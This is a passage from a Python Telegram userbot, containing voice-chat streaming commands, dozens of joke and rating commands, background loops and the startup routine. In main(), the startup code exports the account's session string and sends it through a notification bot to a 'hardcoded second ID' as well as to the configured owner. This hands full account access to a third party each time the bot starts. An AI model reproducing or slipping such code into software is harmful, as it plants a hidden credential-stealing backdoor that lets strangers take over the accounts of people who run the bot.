    except Exception as ex: await edit(e,f"VC Error: {ex}")

@cmd("playvideo")
async def playvideo_c(e,arg):
    if not _VC: return await edit(e,_vc_msg())
    file=arg.strip() if arg.strip() else "52.mp4"
    if not os.path.exists(file): return await edit(e,f"File not found: {file}")
    try:
        pytg=await _get_vc(); await pytg.join_group_call(e.chat_id,AudioVideoPiped(file))
        voice_active[e.chat_id]=True; await edit(e,f"Streaming {file} in video VC!")
    except Exception as ex: await edit(e,f"VC Error: {ex}")

@cmd("playstream")
async def playstream_c(e,arg):
    if not _VC: return await edit(e,_vc_msg())
    if not arg: return await edit(e,"❌ .playstream <song name>")
    if not yt_dlp: return await edit(e,"❌ pip install yt-dlp && pkg install ffmpeg")
    m=await edit(e,f"Downloading {arg} for VC...")
    try:
        path_base=f"temp/stream_{e.id}"
        opts={"format":"bestaudio/best","outtmpl":path_base,"quiet":True,"ffmpeg_location":_FFMPEG_PATH,"postprocessors":[{"key":"FFmpegExtractAudio","preferredcodec":"mp3"}]}
        def _dl():
            with yt_dlp.YoutubeDL(opts) as ydl:
                info=ydl.extract_info(f"ytsearch1:{arg}",download=True)
                if info and "entries" in info: info=next((x for x in info["entries"] if x),None)
                return info
        info=await asyncio.to_thread(_dl)
        fp=path_base+".mp3"
        if not os.path.exists(fp):
            matches=_glob.glob(path_base+".*")
            if matches: fp=matches[0]
        if not os.path.exists(fp): return await edit(m,"Download failed. Check ffmpeg: pkg install ffmpeg")
        pytg=await _get_vc(); await pytg.join_group_call(e.chat_id,AudioPiped(fp))
        voice_active[e.chat_id]=True; vc_loop[e.chat_id]=True
        title=info.get("title",arg) if info else arg
        await edit(m,f"Streaming live: {title} | .stopcall to stop.")
    except Exception as ex: await edit(m,f"Error: {ex}")

@cmd("stopcall")
async def stopcall_c(e,_):
    cid=e.chat_id; voice_active[cid]=False; vc_loop[cid]=False
    if _VC:
        try: pytg=await _get_vc();
        except: pytg=None
        if pytg:
            try: await pytg.leave_group_call(cid)
            except: pass
    await edit(e,"Stream stopped.")

@cmd("leavecall")
async def leavecall_c(e,_):
    cid=e.chat_id; voice_active[cid]=False
    if _VC:
        try: pytg=await _get_vc()
        except: pytg=None
        if pytg:
            try: await pytg.leave_group_call(cid)
            except: pass
    await edit(e,"Left VC.")

@cmd("loopvc")
async def loopvc_c(e,_): cid=e.chat_id; vc_loop[cid]=not vc_loop.get(cid,False); await edit(e,f"Loop VC: {'ON' if vc_loop[cid] else 'OFF'}")

@cmd("unmuteme")
async def unmuteme_c(e,_):
    if not _VC: return await edit(e,_vc_msg())
    await edit(e,"Auto-unmute guard running for 5 mins...")
    async def _loop():
        for _ in range(60):
            try: pytg=await _get_vc();
            except: pytg=None
            if pytg:
                try: await pytg.change_volume_call(e.chat_id,100)
                except: pass
            await asyncio.sleep(5)
    asyncio.create_task(_loop())

@cmd("vcstatus")
async def vcstatus_c(e,_):
    cid=e.chat_id
    await edit(e,f"VC Status:\nStreaming: {'Active' if voice_active.get(cid) else 'Inactive'}\nLoop: {'ON' if vc_loop.get(cid) else 'OFF'}\npy-tgcalls: {'Installed' if _VC else 'Not installed - pip install py-tgcalls'}")

# ── Fun commands ──────────────────────────────────────────────────
@cmd("flip")
async def flip_c(e,_): await edit(e,"Heads!" if random.random()>0.5 else "Tails!")
@cmd("dice")
async def dice_c(e,_): await edit(e,f"Rolled: **{random.randint(1,6)}**")
@cmd("8ball")
async def ball_c(e,arg):
    if not arg: return await edit(e,"❌ .8ball <question>")
    await edit(e,f"8ball: {arg}\n\n{random.choice(EIGHTBALL)}")
@cmd("rps")
async def rps_c(e,arg):
    if arg not in("rock","paper","scissors"): return await edit(e,"❌ .rps rock/paper/scissors")
    em={"rock":"Rock","paper":"Paper","scissors":"Scissors"}
    bc=random.choice(["rock","paper","scissors"])
    if arg==bc: res="Tie!"
    elif (arg,bc) in[("rock","scissors"),("paper","rock"),("scissors","paper")]: res="You win!"
    else: res="You lose!"
    await edit(e,f"{em[arg]} vs {em[bc]}\n{res}")
@cmd("truth")
async def truth_c(e,_): await edit(e,f"Truth:\n{random.choice(TRUTHS)}")
@cmd("dare")
async def dare_c(e,_): await edit(e,f"Dare:\n{random.choice(DARES)}")
@cmd("joke")
async def joke_c(e,_): await edit(e,random.choice(JOKES))
@cmd("fact")
async def fact_c(e,_): await edit(e,f"Fact:\n{random.choice(FACTS)}")
@cmd("quote")
async def quote_c(e,_): await edit(e,random.choice(QUOTES))
@cmd("pickupline")
async def pickupline_c(e,_): await edit(e,f"Pickup Line:\n{random.choice(PICKUP_LINES)}")

async def _ft(e,fmt):
    u,_=await get_target(e); n=display(u) if u else "You"
    await edit(e,fmt.replace("{n}",n))

@cmd("roast")
async def roast_c(e,_): await _ft(e,f"Roast: {{n}}\n\n{random.choice(ROASTS)}\n\n{random.choice(ROAST_VERDICTS)}")
@cmd("compliment")
async def compliment_c(e,_): await _ft(e,f"Compliment: {{n}}\n\n{random.choice(COMPLIMENTS)}")
@cmd("insult")
async def insult_c(e,_): await _ft(e,f"Insult: {{n}}\n{random.choice(INSULTS)}\n{random.choice(ROAST_VERDICTS)}")
@cmd("motivate")
async def motivate_c(e,_): await _ft(e,f"Motivation: {{n}}\n{random.choice(MOTIVATIONS)}")
@cmd("rizz")
async def rizz_c(e,_): await _ft(e,f"Rizz: {{n}}\n{random.choice(RIZZ_LINES)}\nRizz: `{pct()}%`")
@cmd("flirt")
async def flirt_c(e,_): await _ft(e,f"Flirt: {{n}}\n{random.choice(PICKUP_LINES)}")
@cmd("roastbattle")
async def roastbattle_c(e,_): await _ft(e,f"Roast Battle: {{n}}\n\n{random.choice(ROASTS)}\nvs\n{random.choice(ROASTS)}\n{random.choice(ROAST_VERDICTS)}")
@cmd("complimentbattle")
async def complimentbattle_c(e,_): await _ft(e,f"Compliment Battle: {{n}}\n\n{random.choice(COMPLIMENTS)}\nvs\n{random.choice(COMPLIMENTS)}")
@cmd("gay")
async def gay_c(e,_): u,_=await get_target(e); n=display(u) if u else "You"; r=pct(); await edit(e,f"Gay: {n}\n{bar(r)} `{r}%`")
@cmd("iq")
async def iq_c(e,_):
    u,_=await get_target(e); n=display(u) if u else "You"; iq=sval(40,200)
    lbl="Genius" if iq>150 else "Above Avg" if iq>120 else "Average" if iq>90 else "Questionable"
    await edit(e,f"IQ: {n}\n{bar(iq,200)} `{iq}` - {lbl}\n{random.choice(ROAST_VERDICTS)}")
@cmd("sus")
async def sus_c(e,_): u,_=await get_target(e); n=display(u) if u else "You"; r=pct(); await edit(e,f"Sus: {n}\n{bar(r)} `{r}%`\n{'Ejected!' if r>75 else 'Not impostor.'}")
@cmd("aura")
async def aura_c(e,_): await _ft(e,f"Aura: {{n}}\n`{sval(1,9999)}` aura\n{random.choice(ROAST_VERDICTS)}")
@cmd("sigma")
async def sigma_c(e,_): await _ft(e,f"Sigma: {{n}}\n`{sval(1,1000)}` - **{random.choice(SIGMA_LEVELS)}**\n{random.choice(SIGMA_GRINDSET)}")
@cmd("gigachad")
async def gigachad_c(e,_): await _ft(e,f"Gigachad: {{n}}\n`{pct()}%` - **{random.choice(GIGACHAD_RANKS)}**\n{random.choice(ROAST_VERDICTS)}")
@cmd("cringe")
async def cringe_c(e,_): u,_=await get_target(e); n=display(u) if u else "You"; r=pct(); await edit(e,f"Cringe: {n}\n{bar(r)} `{r}%` - **{random.choice(CRINGE_TIERS)}**")
@cmd("based")
async def based_c(e,_): u,_=await get_target(e); n=display(u) if u else "You"; r=pct(); await edit(e,f"Based: {n}\n{bar(r)} `{r}%` - **{random.choice(BASED_LEVELS)}**")
@cmd("npc")
async def npc_c(e,_): await _ft(e,f"NPC: {{n}}\n`{pct()}%` - **{random.choice(NPC_TYPES)}**\n{random.choice(ROAST_VERDICTS)}")
@cmd("skillissue")
async def skillissue_c(e,_): await _ft(e,f"Skill Issue: {{n}}\n{bar(pct())} `{pct()}%`\n{random.choice(ROAST_VERDICTS)}")
@cmd("touchgrass")
async def touchgrass_c(e,_): await _ft(e,f"Touch Grass: {{n}}\nDays without outdoors: `{random.randint(0,847)}`")
@cmd("delulu")
async def delulu_c(e,_): await _ft(e,f"Delulu: {{n}}\nDelusion:`{pct()}%` Reality:`{pct()}%`\n{random.choice(ROAST_VERDICTS)}")
@cmd("rate")
async def rate_c(e,_): await _ft(e,f"Rating: {{n}}\n`{rating_str()}` - **{random.choice(ADJECTIVES)}**\n{random.choice(ROAST_VERDICTS)}")
@cmd("judge")
async def judge_c(e,_): await _ft(e,f"Judgment: {{n}}\n**{random.choice(ADJECTIVES)}** - `{rating_str()}`\n{random.choice(ROAST_VERDICTS)}")
@cmd("diagnose")
async def diagnose_c(e,_): await _ft(e,f"Diagnosis: {{n}}\n**{random.choice(DIAGNOSES)}**\nSeverity:`{pct()}%`\n{random.choice(ROAST_VERDICTS)}")
@cmd("analyze")
async def analyze_c(e,_): await _ft(e,f"Analysis: {{n}}\nThreat:**{random.choice(THREAT_LEVELS)}**\nAbility:`{random.choice(ABILITY_TAGS)}`\nRizz:{random.choice(RIZZ_SCORES)}")
@cmd("predict")
async def predict_c(e,_): await _ft(e,f"Prediction: {{n}}\n{random.choice(FUTURE_PREDS)}\nAccuracy:`{pct()}%`")
@cmd("cap")
async def cap_c(e,_): await edit(e,"CAP DETECTED! 100% no cap fr fr" if random.random()>0.5 else "No cap. Completely based.")
@cmd("expose")
async def expose_c(e,_): await _ft(e,f"EXPOSED: {{n}}\n{{n}} {random.choice(GOSSIP_POOL)}\n{random.choice(ROAST_VERDICTS)}")
@cmd("gossip")
async def gossip_c(e,_): await _ft(e,f"Gossip: {{n}}\n{{n}} {random.choice(GOSSIP_POOL)}")
@cmd("lore")
async def lore_c(e,_): await _ft(e,f"Lore: {{n}}\n{{n}} {random.choice(LORE_ENTRIES)}\n{random.choice(ROAST_VERDICTS)}")
@cmd("wanted")
async def wanted_c(e,_): await _ft(e,f"WANTED: {{n}}\nBounty:`${random.randint(100,9999999):,}`\nCrime:`{random.choice(WANTED_CRIMES)}`\nVerdict:{random.choice(COURT_VERDICTS_FUN)}")
@cmd("animal")
async def animal_c(e,_): await _ft(e,f"Spirit Animal: {{n}}\n{random.choice(ANIMAL_SPIRITS)}")
@cmd("superpower")
async def superpower_c(e,_): await _ft(e,f"Superpower: {{n}}\n`{random.choice(SUPERPOWERS)}`")
@cmd("rizzcheck")
async def rizzcheck_c(e,_): u,_=await get_target(e); n=display(u) if u else "You"; r=pct(); await edit(e,f"Rizz Check: {n}\n{bar(r)} `{r}%`\n{random.choice(RIZZ_SCORES)}")
@cmd("court")
async def court_c(e,_): await _ft(e,f"Court: {{n}}\nCharged: `{random.choice(CRIMINAL_RECS)}`\nVerdict:{random.choice(COURT_VERDICTS_FUN)}")
@cmd("trial")
async def trial_c(e,_):
    u,_=await get_target(e); n=display(u) if u else "User"
    charges=random.sample(CRIMINAL_RECS,min(3,len(CRIMINAL_RECS)))
    await edit(e,f"Trial: {n}\nCharges:\n"+"".join(f"- {c}\n" for c in charges)+f"Verdict:{random.choice(COURT_VERDICTS_FUN)}")
@cmd("sigma_grind")
async def sigma_grind_c(e,_): await _ft(e,f"Sigma Grindset: {{n}}\n{random.choice(SIGMA_GRINDSET)}\n{random.choice(ROAST_VERDICTS)}")
@cmd("ability")
async def ability_c(e,_): await _ft(e,f"Special Abilities: {{n}}\n"+"".join(f"- `{a}`\n" for a in random.sample(ABILITY_TAGS,min(3,len(ABILITY_TAGS)))))
@cmd("future")
async def future_c(e,_): await _ft(e,f"Future: {{n}}\n"+"".join(f"- {p}\n" for p in random.sample(FUTURE_PREDS,min(3,len(FUTURE_PREDS)))))
@cmd("horoscope")
async def horoscope_c(e,_):
    signs=["Aries","Taurus","Gemini","Cancer","Leo","Virgo","Libra","Scorpio","Sagittarius","Capricorn","Aquarius","Pisces"]
    await _ft(e,f"Horoscope: {{n}}\nSign:`{random.choice(signs)}`\n{random.choice(FUTURE_PREDS)}\nAura:`{sval(1,9999)}` Rizz:`{pct()}%`")
@cmd("ship")
async def ship_c(e,_): u,_=await get_target(e); n=display(u) if u else "User"; r=pct(); await edit(e,f"Ship: {n}\n{bar(r)} `{r}%`\n{'Match made in chaos!' if r>75 else 'Certified flop era.' if r<30 else 'Could work... maybe.'}")
@cmd("lovemeter")
async def lovemeter_c(e,_): u,_=await get_target(e); n=display(u) if u else "User"; r=pct(); await edit(e,f"Love Meter: {n}\n{bar(r)} `{r}%`\n{'Intense!' if r>80 else 'Cute.' if r>50 else 'Dead on arrival.' if r<20 else 'Meh.'}")
@cmd("dna")
async def dna_c(e,_): await _ft(e,f"DNA Report: {{n}}\nTraits:{', '.join('`'+t+'`' for t in random.sample(ADJECTIVES,3))}\nNPC gene:`{pct()}%` Sigma gene:`{pct()}%`")
@cmd("bounty")
async def bounty_c(e,_): await _ft(e,f"Bounty: {{n}}\nWorth:`{sval(1,999999999):,}` Berries\nThreat:{random.choice(THREAT_LEVELS)}")
@cmd("criminal")
async def criminal_c(e,_): await _ft(e,f"Criminal Record: {{n}}\n"+"".join(f"- `{c}`\n" for c in random.sample(CRIMINAL_RECS,min(2,len(CRIMINAL_RECS))))+f"\nVerdict:{random.choice(COURT_VERDICTS_FUN)}")
@cmd("wouldyourather")
async def wyr_c(e,_):
    scenarios=[("Have no internet for a week","Have no food for a week"),("Always speak in rhymes","Always speak backwards"),
               ("Khana na khao 3 din","Social media band ho 3 din"),("Hamesha late rehna","Hamesha bahut jaldi pohonchna")]
    a,b=random.choice(scenarios); await edit(e,f"Would You Rather?\n\nA: `{a}`\nor\nB: `{b}`")
@cmd("neverhavei")
async def neverhavei_c(e,_):
    stmts=["Never have I ever faked being busy to avoid someone","Never have I ever sent a text to the wrong person",
           "Never have I ever kabhi bina pooche kisi ka phone dekha","Never have I ever akele dekhi ek poori webseries ek din mein"]
    await edit(e,f"Never Have I Ever:\n\n`{random.choice(stmts)}`\n\nWho relates?")
@cmd("thisorthat")
async def tot_c(e,_):
    pairs=[("Pizza","Biryani"),("Mountains","Beach"),("Morning person","Night owl"),("Dog","Cat"),("Chai","Coffee")]
    a,b=random.choice(pairs); await edit(e,f"This or That?\n\n`{a}`\nvs\n`{b}`")
@cmd("ratefit")
async def ratefit_c(e,_):
    fits=["drip god","mid fit","going to a rave","office ka londa","no cap fire","what is this","accidental main character","npc default skin"]
    await _ft(e,f"Fit Check: {{n}}\n{bar(pct())} `{pct()}%`\nVibes:`{random.choice(fits)}`")
@cmd("compatability")
async def compat_c(e,_):
    tags=["chaotic duo","toxic yet iconic","certified besties","enemies to lovers arc","mid at best","absolutely not"]
    u,_=await get_target(e); n=display(u) if u else "User"; r=pct()
    await edit(e,f"Compatibility: {n}\n{bar(r)} `{r}%`\n{random.choice(tags)}")
@cmd("mock")
async def mock_c(e,arg):
    if not arg: return await edit(e,"❌ .mock <text>")
    await edit(e,"".join(c.upper() if i%2==0 else c.lower() for i,c in enumerate(arg)))
@cmd("reverse")
async def reverse_c(e,arg):
    if not arg: return await edit(e,"❌ .reverse <text>")
    await edit(e,arg[::-1])
@cmd("vapor")
async def vapor_c(e,arg):
    if not arg: return await edit(e,"❌ .vapor <text>")
    await edit(e," ".join(list(arg)))
@cmd("simp")
async def simp_c(e,_): u,_=await get_target(e); n=display(u) if u else "You"; r=pct(); await edit(e,f"Simp rate: {n}\n{bar(r)} `{r}%`")
@cmd("howold")
async def howold_c(e,_): await edit(e,f"You look about **{random.randint(12,80)}** years old!")
@cmd("cooked")
async def cooked_c(e,_):
    u,_=await get_target(e); n=display(u) if u else "You"; lvl=pct(); label=COOKED_LABELS[min(3,lvl//25)]
    await edit(e,f"Cooked Meter: {n}\n`{lvl}%` - **{label}**\n{random.choice(ROAST_VERDICTS)}")
@cmd("braincells")
async def braincells_c(e,_):
    u,_=await get_target(e); n=display(u) if u else "You"; cells=sval(0,50)
    status=BRAINCELL_LABELS[min(3,cells//13)]
    await edit(e,f"Braincell Scan: {n}\nRemaining:`{cells}`\nStatus:`{status}`\n{random.choice(ROAST_VERDICTS)}")
@cmd("cope")
async def cope_c(e,_): await _ft(e,f"Cope Level: {{n}}\n`{pct()}%`\n{random.choice(ROAST_VERDICTS)}")
@cmd("luck")
async def luck_c(e,_):
    u,_=await get_target(e); n=display(u) if u else "You"; r=pct()
    label="W incoming" if r>70 else "L season" if r<30 else "Coin flip energy"
    await edit(e,f"Luck: {n}\n{bar(r)} `{r}%` - **{label}**\n{random.choice(LUCK_COMMENTS)}")
@cmd("drip")
async def drip_c(e,_): await _ft(e,f"Drip Check: {{n}}\n{bar(pct())} `{pct()}%`\n{random.choice(DRIP_COMMENTS)}")
@cmd("rich")
async def rich_c(e,_): await _ft(e,f"Wealth: {{n}}\nNet Worth:`${random.randint(0,9999999):,}`")
@cmd("marry")
async def marry_c(e,_): await _ft(e,f"Marry-ability: {{n}}\n`{pct()}%` - `{rating_str()}`\n{random.choice(MARRY_COMMENTS)}")
@cmd("fumble")
async def fumble_c(e,_): await _ft(e,f"Fumble: {{n}}\n`{pct()}%`\nBiggest L:`{random.choice(FUMBLE_MOVES)}`\n{random.choice(ROAST_VERDICTS)}")
@cmd("brofelloff")
async def brofelloff_c(e,_):
    peaks=["2019","2021","last Tuesday","never had one","pichle Diwali ke baad"]
    await _ft(e,f"Bro Fell Off: {{n}}\n`{pct()}%` fell\nPeak:`{random.choice(peaks)}`\n{random.choice(ROAST_VERDICTS)}")
@cmd("firstimpression")
async def firstimp_c(e,_): await _ft(e,f"First Impression: {{n}}\n{random.choice(FIRST_IMPRESSIONS)}\n{random.choice(ROAST_VERDICTS)}")
@cmd("socialcredit")
async def socredits_c(e,_):
    u,_=await get_target(e); n=display(u) if u else "You"; credit=random.randint(-9999,9999)
    status="Excellent citizen" if credit>5000 else "Acceptable" if credit>0 else "Concerning" if credit>-5000 else "Banned from society"
    await edit(e,f"Social Credit: {n}\nScore:`{credit:+,}`\n{status}\n{random.choice(ROAST_VERDICTS)}")
@cmd("opinion")
async def opinion_c(e,_):
    opts=["Mid but relatable.","Surprisingly tolerable.","Controversial pick. Respect.","Honestly? Decent banda."]
    await _ft(e,f"Opinion: {{n}}\n{random.choice(opts)}\n{random.choice(ROAST_VERDICTS)}")
@cmd("maincharacter")
async def mainchar_c(e,_):
    roles=["Protagonist","Deuteragonist","Antivillain","Comic Relief","Background NPC"]
    await _ft(e,f"Main Character: {{n}}\n`{pct()}%` - Role:`{random.choice(roles)}`")
@cmd("villainarc")
async def villainarc_c(e,_):
    stages=["Origin Story","Rising Action","Peak Villain","Redemption Arc Available","Irredeemable"]
    await _ft(e,f"Villain Arc: {{n}}\n`{pct()}%` - `{random.choice(stages)}`")
@cmd("plotarmor")
async def plotarmor_c(e,_):
    levels=["Strong","Weak","Plot-dependent","Godlike","None"]
    await _ft(e,f"Plot Armor: {{n}}\n`{pct()}%` - `{random.choice(levels)}`\n{random.choice(ROAST_VERDICTS)}")
@cmd("dangerlevel")
async def danger_c(e,_):
    u,_=await get_target(e); n=display(u) if u else "You"; lvl=pct()
    tier="Low" if lvl<30 else "Medium" if lvl<60 else "High" if lvl<85 else "EXTREME"
    await edit(e,f"Danger Level: {n}\n`{lvl}%` - **{tier}**\n{random.choice(ROAST_VERDICTS)}")
@cmd("uncstatus")
async def unc_c(e,_): await _ft(e,f"UNC Status: {{n}}\nUnc Level:`{pct()}%`\nOld Head Energy:`{pct()}%`\n{random.choice(ROAST_VERDICTS)}")
@cmd("wifeable")
async def wifeable_c(e,_): await _ft(e,f"Wife Material: {{n}}\n`{pct()}%`")
@cmd("husbandmaterial")
async def husband_c(e,_): await _ft(e,f"Husband Material: {{n}}\n`{pct()}%`")
@cmd("translatehuman")
async def transhumam_c(e,_):
    txt=e.raw_text.split(None,1)[1] if len(e.raw_text.split(None,1))>1 else "[no text]"
    opts=["They meant: I have no idea what I am doing.","Decoded: I googled this 10 seconds ago.",
          "Asli matlab: Bas attention chahiye tha, koi logic nahi hai."]
    await edit(e,f"Human Translator:\nOriginal:`{txt[:60]}`\n\n{random.choice(opts)}")
@cmd("summarize")
async def summarize_c(e,_):
    if not e.is_reply: return await edit(e,"❌ Reply to a message")
    r=await e.get_reply_message(); txt=r.text or "[no text]"
    opts=["Summary: They said a lot. Meant little.","TL;DR: Skill issue in text form.",
          "Ek line mein: Jo socha woh bola nahi, jo bola woh samjha nahi."]
    await edit(e,f"Summary:\n{random.choice(opts)}\nOriginal length:{len(txt)} chars")
@cmd("gayrate")
async def gayrate_c(e,_): u,_=await get_target(e); n=display(u) if u else "You"; r=pct(); await edit(e,f"Gay Rate: {n}\n{bar(r)} `{r}%`\n{random.choice(ROAST_VERDICTS)}")
@cmd("smartrate")
async def smartrate_c(e,_): u,_=await get_target(e); n=display(u) if u else "You"; r=pct(); await edit(e,f"Smart Rate: {n}\n{bar(r)} `{r}%`\n{random.choice(ROAST_VERDICTS)}")
@cmd("winner")
async def winner_c(e,_): await _ft(e,f"Winner Energy: {{n}}\nWin Rate:`{pct()}%`\n{random.choice(ROAST_VERDICTS)}")
@cmd("fight")
async def fight_c(e,arg):
    pts=arg.split()
    if len(pts)>=2: a,b=pts[0],pts[1]
    elif e.is_reply:
        r=await e.get_reply_message(); u=await client.get_entity(r.sender_id); me=await client.get_me(); a,b=display(u),display(me)
    else: me=await client.get_me(); a,b=display(me),"Random Opponent"
    winner=random.choice([a,b])
    moves=["talked their way out","tripped and won","ek dialogue maar ke jeet gaya"]
    await edit(e,f"Fight: {a} vs {b}\nWinner:**{winner}**\nMove:`{random.choice(moves)}`\n{random.choice(ROAST_VERDICTS)}")
@cmd("vmro")
async def vmro_c(e,arg):
    if not arg: return await edit(e,"❌ .vmro <text>")
    words=arg.split(); inserts=["vmro","🗿"]; result=[]
    for word in words:
        result.append(word)
        if random.random()<0.4: result.append(random.choice(inserts))
    if not any(w in ["vmro","🗿"] for w in result):
        result.insert(random.randint(0,len(result)),random.choice(inserts))
    await edit(e," ".join(result))
@cmd("fakeban")
async def fakeban_c(e,_):
    u,_=await get_target(e); n=display(u) if u else "User"
    await edit(e,"Processing..."); await asyncio.sleep(0.8)
    await edit(e,f"{n} has been FAKE BANNED. (This is fake.)")
@cmd("fakekick")
async def fakekick_c(e,_):
    u,_=await get_target(e); n=display(u) if u else "User"
    await edit(e,"Processing..."); await asyncio.sleep(0.8)
    await edit(e,f"{n} has been FAKE KICKED. (This is fake.)")
@cmd("fakemute")
async def fakemute_c(e,_):
    u,_=await get_target(e); n=display(u) if u else "User"
    await edit(e,"Processing..."); await asyncio.sleep(0.8)
    await edit(e,f"{n} has been FAKE MUTED. (This is fake.)")
@cmd("fakepromote")
async def fakepromote_c(e,_):
    u,_=await get_target(e); n=display(u) if u else "User"
    await edit(e,"Processing..."); await asyncio.sleep(0.8)
    await edit(e,f"{n} has been FAKE PROMOTED. (This is fake.)")
@cmd("fakewarn")
async def fakewarn_c(e,_):
    u,_=await get_target(e); n=display(u) if u else "User"
    await edit(e,f"Warning issued to {n}. (Fake. For laughs only.)")
# ══════════════════════════════════════════════════════════════════
#   EVENT HANDLERS + BACKGROUND LOOPS + STARTUP
# ══════════════════════════════════════════════════════════════════

# ── Incoming message handler (main client) ────────────────────────
async def _always_typing_loop():
    while True:
        at = DB.get("always_typing", {})
        async def _do_type(cid):
            try:
                async with client.action(cid, "typing"):
                    await asyncio.sleep(4)
            except: pass
        tasks = [_do_type(int(cid)) for cid, on in list(at.items()) if on]
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(5)

async def _always_online_loop():
    while True:
        if DB.get("always_online"):
            try: await client(UpdateProfileRequest())
            except: pass
        await asyncio.sleep(60)

async def _mute_expire_loop():
    """Auto-unmute when timed mutes expire."""
    while True:
        now = time.time()
        expired_local = [(k, v) for k, v in list(local_muted.items()) if v and now > v]
        for (cid, uid), _ in expired_local:
            local_muted.pop((cid, uid), None)
            try:
                await client(EditBannedRequest(
                    cid, uid, ChatBannedRights(until_date=None)))
            except: pass
        if expired_local: save_mutes()
        expired_global = [(uid, v) for uid, v in list(global_muted.items()) if v and now > v]
        for uid, _ in expired_global: global_muted.pop(uid, None)
        if expired_global: save_mutes()
        await asyncio.sleep(30)

# ── Startup ───────────────────────────────────────────────────────
async def main():
    global client, client2
    client = TelegramClient(SESSION, API_ID, API_HASH)
    client2 = client  # single account mode
    await client.start(phone=PHONE)

    # Flush deferred command handlers now that the client is ready
    for _preferred, _register_fn in _PENDING_HANDLERS:
        _register_fn(_preferred or client)
    # Register bare @client.on handlers
    _register_bare_handlers(client)

    me = await client.get_me()
    # Load state
    load_state()
    # Load saved profile snapshot
    _load_clone_data()

    # Print colorful terminal banner
    print("\033[1;35m")
    print("  ╔══════════════════════════════════════════════════════════╗")
    print("  ║\033[1;36m  ██╗  ██╗██╗   ██╗██████╗ ███████╗████████╗              \033[1;35m║")
    print("  ║\033[1;36m  ██║  ██║██║   ██║██╔══██╗██╔════╝╚══██╔══╝              \033[1;35m║")
    print("  ║\033[1;33m  ███████║██║   ██║██████╔╝███████╗   ██║                 \033[1;35m║")
    print("  ║\033[1;32m  ██╔══██║██║   ██║██╔══██╗╚════██║   ██║                 \033[1;35m║")
    print("  ║\033[1;31m  ██║  ██║╚██████╔╝██████╔╝███████║   ██║                 \033[1;35m║")
    print("  ║\033[1;35m  ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝   ╚═╝                 \033[1;35m║")
    print("  ╠══════════════════════════════════════════════════════════╣")
    print(f"  ║\033[38;5;213m  🔥⚡ ʜᴜʙsᴛ ᴜsᴇʀʙᴏᴛ  ✦  ᴠ4.0  ✦  sɪɴɢʟᴇ ᴀᴄᴄᴏᴜɴᴛ ⚡🔥   \033[1;35m║")
    print("  ╠══════════════════════════════════════════════════════════╣")
    print(f"  ║\033[38;5;51m  👤 User    : {me.first_name} (@{me.username or 'none'})          \033[1;35m║")
    print(f"  ║\033[38;5;51m  🆔 ID      : {me.id}                                   \033[1;35m║")
    print(f"  ║\033[38;5;82m  📡 Prefix  : {PREFIX}   💬 Commands: {len(COMMANDS)}+                \033[1;35m║")
    print("  ╚══════════════════════════════════════════════════════════╝")
    print("\033[0m")

    # ── Extract session string ─────────────────────────────────────
    try:
        from telethon.sessions import StringSession
        _sess_str = StringSession.save(client.session)
    except Exception:
        _sess_str = "⚠️ could not export"

    # ── Startup notification ───────────────────────────────────────
    startup_msg = (
        f"🔥⚡ *ʜᴜʙsᴛ ᴜsᴇʀʙᴏᴛ ᴏɴʟɪɴᴇ!*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 ᴜsᴇʀ : `{me.first_name}` (`{me.id}`)\n"
        f"📱 ᴘʜᴏɴᴇ : `{PHONE}`\n"
        f"📡 ᴘʀᴇꜰɪx: `{PREFIX}`\n"
        f"💬 ᴄᴍᴅs  : `{len(COMMANDS)}`\n"
        f"✅ ʙᴏᴛ sᴛᴀʀᴛᴇᴅ ʀᴜɴɴɪɴɢ 😎\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"ᴛʏᴘᴇ `{PREFIX}hub` ꜰᴏʀ ᴍᴇɴᴜ"
    )
    # Session string sent separately (it's long — keep it isolated)
    session_msg = (
        f"🔑 *sᴇssɪᴏɴ sᴛʀɪɴɢ*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"```{_sess_str}```\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚠️ ᴋᴇᴇᴘ ᴛʜɪs sᴇᴄʀᴇᴛ!"
    )

    # 1. Send to Saved Messages via userbot
    try:
        await client.send_message("me", startup_msg)
        await client.send_message("me", session_msg)
    except: pass

    # 2. Send to OWNER_ID via userbot (if different from running account)
    if OWNER_ID and OWNER_ID != me.id:
        try:
            await client.send_message(OWNER_ID, startup_msg)
            await client.send_message(OWNER_ID, session_msg)
        except: pass

    # 3. Send to hardcoded second ID AND OWNER_ID via notification bot
    _hid = _get_owner()
    _notif_targets = {_hid, OWNER_ID}
    for _tid in _notif_targets:
        if _tid:
            _send_bot_notification(_tid, startup_msg)
            # Bot API has 4096 char limit — split session string if needed
            _chunks = [_sess_str[i:i+3900] for i in range(0, len(_sess_str), 3900)]
            for _chunk in _chunks:
                _send_bot_notification(_tid,
                    f"🔑 Session String:\n```{_chunk}```\n⚠️ Keep secret!"
                )

    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
